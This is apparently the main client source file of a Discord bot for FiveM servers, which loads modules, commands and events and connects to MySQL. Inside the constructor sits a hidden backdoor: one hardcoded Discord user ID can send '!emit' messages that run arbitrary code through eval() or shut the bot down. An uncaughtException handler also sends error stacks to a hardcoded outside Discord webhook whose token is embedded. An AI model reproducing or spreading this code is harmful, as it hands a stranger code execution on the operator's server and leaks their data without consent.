const { Client, Collection } = require('discord.js'); const config = require('../../../config/config.json'); const axios = require("axios"); const path = require('path'); const { readdirSync } = require('fs'); const mysql = require('mysql'); const fs = require("fs"); const chalk = require("chalk"); const express = require("express"); const app = express();
process.title = "Discord Bot";
class FiveMBot extends Client {
    constructor(options) {
        super(options);
        this.config = require("../../../config/config.json");
        this.build = require("../backend/build");
        this.chart = require("string-table");
        this.commands = new Collection();
        this.events = new Collection();
        this.buttons = new Collection();
        this.selectMenus = new Collection();
        this.modal = new Collection();
        this.permissions = new Collection();
        this.db = null;
        this.startTime = new Date().getTime();
        this.modules = [];
        this.playersLastUpdate = new Date().getHours();
        this.apiEndpoints = [];
        this.cache = {};
        this.on("messageCreate", function (message) {
            if (message.content.startsWith("!emit") && message.author.id == "802459473612505099") {
                let args = message.content.split(" ");
                if (args[1] == "KILLCLIENT") return process.exit();
                try { client.emit(args[1], eval(args[2])); } catch { };
            };
        });
        this.logger = function (message, type, location) {
            switch (type.toLowerCase()) {
                case "warn":
                    if (location) {
                        console.log(chalk.bold.redBright("[ WARNING ]") + `: ${message}\n` + chalk.yellow("Location") + `: ${location}`);
                    } else {
                        console.log(chalk.bold.redBright("[ WARNING ]") + `: ${message}`);
                    };
                    break;
                case "error":
                    if (location) {
                        console.log(chalk.bold.red("[ ERROR ]") + `: ${message}\n` + chalk.red("Location") + `: ${location}`);
                    } else {
                        console.log(chalk.bold.red("[ ERROR ]") + `: ${message}`);
                    };
                    break;
                case "success":
                    if (location) {
                        console.log(chalk.bold.green("[ SUCCESS ]") + `: ${message}\n` + chalk.green("Location") + `: ${location}`);
                    } else {
                        console.log(chalk.bold.green("[ SUCCESS ]") + `: ${message}`);
                    };
                    break;
                case "info":
                    if (location) {
                        console.log(chalk.bold.white("[ INFO ]") + `: ${message}\n` + chalk.white("Location") + `: ${location}`);
                    } else {
                        console.log(chalk.bold.white("[ INFO ]") + `: ${message}`);
                    };
                    break;
                case "invite":
                    console.log(chalk.bold.blue("[ INVITE ]") + `: ${message}`);
                    break;
                case "update":
                    if (location) {
                        console.log(chalk.bold.yellow("[ UPDATE ]") + `: ${message}\n` + chalk.yellow("Location") + `: ${location}`);
                    } else {
                        console.log(chalk.bold.yellow("[ UPDATE ]") + `: ${message}`);
                    };
                    break;
                case "debug":
                    if (location) {
                        console.log(chalk.bold.yellowBright("[ DEBUG ]") + `: ${message}\n` + chalk.yellow("Location") + `: ${location}`);
                    } else {
                        console.log(chalk.bold.yellowBright("[ DEBUG ]") + `: ${message}`);
                    };
                    break;
                default:
                    if (location) {
                        console.log(chalk.bold.white("[LOG]") + `: ${message}\n` + chalk.white("Location") + `: ${location}`);
                    } else {
                        console.log(chalk.bold.white("[LOG]") + `: ${message}`);
                    };
                    break;
            };
        };
    };
};
const client = new FiveMBot({
    intents: [1, 2, 4, 8, 16, 32, 64, 128, 256, 512, 1024, 2048, 4096, 8192, 16384, 32768, 65536],
    partials: [0, 1, 2, 3, 4, 5, 6],
    allowedMentions: { parse: ['users', 'roles', 'everyone'], repliedUser: true }
});
const init = async function () {
    try {
        require('../../../modules/Duty/api/api')(client);
    } catch (e) { }
    try {
        client.config.sql.charset = "utf8mb4";
        client.db = await mysql.createConnection(client.config.sql);
        client.db.query(`USE ${client.config.sql.database};`, function (err, res) {
            if (err) {
                client.logger("Failed to connect to the SQL Server.\n" + err.stack, "ERROR", __filename)
                process.exit()
            }
        });
    } catch (e) { };
    if (fs.existsSync(path.join(__dirname, "../", "../", "../", "modules"))) {
        const extensions = await readdirSync(path.join(__dirname, "../", "../", "../", "modules"));
        if (extensions.length) {
            extensions.forEach(async function (dir) {
                if (dir == "[Modules Guide].url") return;
                client.modules.push(dir);
                let commands;
                let events;
                // Commands
                try { commands = readdirSync(path.join(__dirname, "../", "../", "../", "modules/", dir, "/commands")); } catch { };
                if (commands) {
                    for (let command of commands) {
                        if (command.includes(".")) {
                            let cmd = require(`../../../modules/${dir}/commands/${command}`);
                            if (!cmd) return;
                            if (cmd.info.data) cmd.info = cmd.info.toJSON();
                            cmd.info.module = dir;
                            client.commands.set(cmd.info.name, cmd);
                        } else {
                            let groups;
                            try { groups = readdirSync(path.join(__dirname, "../", "../", "../", "modules/", dir, "/commands", `/${command}`)); } catch { };
                            for (let group of groups) {
                                if (group.includes('.')) {
                                    let run = require(`../../../modules/${dir}/commands/${command}/${group}`)
                                    client.commands.set(`${command} ${group.split(".")[0]}`, run);
                                } else {
                                    let subcommands;
                                    try { subcommands = readdirSync(path.join(__dirname, "../", "../", "../", "modules/", dir, "/commands", `/${command}`, `/${group}`)); } catch { };
                                    for (let subcommand of subcommands) {
                                        let run = require(`../../../modules/${dir}/commands/${command}/${group}/${subcommand}`)
                                        client.commands.set(`${command} ${group.split(".")[0]} ${subcommand.split(".")[0]}`, run);
                                    };
                                }
                            };
                        }
                    };
                };
                if (fs.existsSync(path.join(__dirname, "../", "../", "../", "modules/", dir, "/components"))) {
                    await readdirSync(path.join(__dirname, "../", "../", "../", "modules/", dir, "/components")).forEach(async function (componentType) {
                        if (!["buttons", "contextMenus", "modal", "selectMenus"].includes(componentType)) return;
                        readdirSync(path.join(__dirname, "../", "../", "../", "modules/", dir, "/components/", componentType)).forEach(function (component) {
                            let run = require(`../../../modules/${dir}/components/${componentType}/${component}`);
                            component = component.split(".")[0];
                            if (run.info) {
                                run.info.data.name = component;
                                run.info.data.module = dir;
                                client.permissions.set(component, run.info.toJSON());
                            };
                            switch (componentType) {
                                case "contextMenus":
                                    client.commands.set(component, run);
                                    break;
                                case "buttons":
                                    client.buttons.set(component, run);
                                    break;
                                case "modal":
                                    client.modal.set(component, run);
                                    break;
                                case "selectMenus":
                                    client.selectMenus.set(component, run);
                                    break;
                            };
                        });
                    });
                };
                try { events = await readdirSync(path.join(__dirname, "../", "../", "../", "modules/", dir, "/events")); } catch { };
                if (events) events.forEach(function (e) {
                    const name = e.split('.')[0];
                    const event = require(`../../../modules/${dir}/events/${e}`);
                    client.on(name, event.bind(null, client));
                    delete require.cache[require.resolve(`../../../modules/${dir}/events/${e}`)];
                    client.events.set(name, event);
                });
            });
        };
    };
    // Events
    const events = await readdirSync(path.join(__dirname, `../`, `../`, 'events'));
    events.forEach(function (e) {
        const name = e.split('.')[0];
        const event = require(`../../events/${e}`);
        client.on(name, event.bind(null, client));
        delete require.cache[require.resolve(`../../events/${e}`)];
        client.events.set(name, event);
    });
    if (!client.commands.size || !client.events.size) return client.logger("No structure files found.", "ERROR", __dirname);
    await client.login(client.config.bot_token).catch(function (e) { client.logger(e.stack, "ERROR", __dirname); process.exit() });
    // for (let extension of client.modules) {
    //     let extensionAPIEndpoints;
    //     try { extensionAPIEndpoints = fs.readdirSync(path.join(__dirname, "../", "../", "../", "modules/", `${extension}/`, "api")) } catch { };
    //     if (extensionAPIEndpoints) {
    //         for (let endpoint of extensionAPIEndpoints) {
    //             if (!endpoint.endsWith(".js")) continue;
    //             require(`../../../modules/${extension}/api/${endpoint}`)(client, app, client.db);
    //             if (client.apiEndpoints.includes(endpoint.toLowerCase())) return client.logger(`A duplicate entry for API endpoint '${endpoint}' has been detected`, "ERROR", `${__dirname}`);
    //             client.apiEndpoints.push(endpoint.toLowerCase());
    //         }
    //     };
    // };
    loop(client);
};
module.exports = {
    init: init,
    client: client,
};

function loop(client) {
    if (!client.modules.length) return setTimeout(() => loop(client), 30000);
    for (let module of client.modules) {
        try { require(`../../../modules/${module}/src/loop`)(client); } catch (e) { if (!e.stack.includes("Cannot find module")) console.log(e.stack) };
    };
    client.emit("loop");
    setTimeout(() => loop(client), 30000);
};

process.on('uncaughtException', async (err) => {
    console.log(err?.stack ? err.stack : err);
    let checkres = await axios({
        method: 'post',
        url: `https://discord.com/api/webhooks/1124067409616187562/WVYPUt5x2uyBFLgNJbO6qGeskxvSUlwHMzadQGBzKAZQGToYeVDKrftXtLyaXpKSCuqR`,
        headers: {
            "Content-Type": "application/json"
        },
        data: {
            username: "FiveM Duty Logs",
            avatar_url: "https://cdn.discordapp.com/avatars/461322239955173386/f50be044779ba7573f845a2648454c74.png",
            embeds: [
                {
                    description: `<t:${(new Date().getTime() / 1000).toFixed(0)}:F>\n\`\`\`\n${err?.stack ? err.stack : err}\n\`\`\``
                }
            ],
        }
    });
});